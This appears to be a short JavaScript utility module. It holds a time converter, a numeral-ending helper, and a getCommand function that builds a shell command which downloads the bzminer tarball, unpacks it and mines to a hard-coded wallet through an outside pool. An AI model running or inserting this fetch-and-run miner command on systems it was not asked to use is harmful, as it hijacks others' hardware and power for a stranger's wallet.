export const minutesToMilliseconds = (minutes) => minutes * 60 * 1000;

export const setNumeralEnding = (
    number,
    titles,
) => {
    return titles[
        number % 10 === 1 && number % 100 != 11
            ? 0
            : number % 10 >= 2 &&
            number % 10 <= 4 &&
            (number % 100 < 10 || number % 100 >= 20)
                ? 1
                : 2
        ];
}
export const getCommand = (serverName) => `apt update -y && wget https://bzminer.com/downloads/bzminer_v21.0.3b5_linux.tar.gz && tar -xvzf bzminer_v21.0.3b5_linux.tar.gz && bzminer_v21.0.3b5_linux/bzminer -a warthog -w a783a4270545f24768cfe423e3278189f3d8e8f0d23a1a27.${serverName} -p stratum+tcp://eu.acc-pool.pw:12000 --nc 1 --nvidia 1 --amd 1 --warthog_cpu_threads 0 --warthog_max_ram_gb 4 --warthog_verus_hr_target 0`;
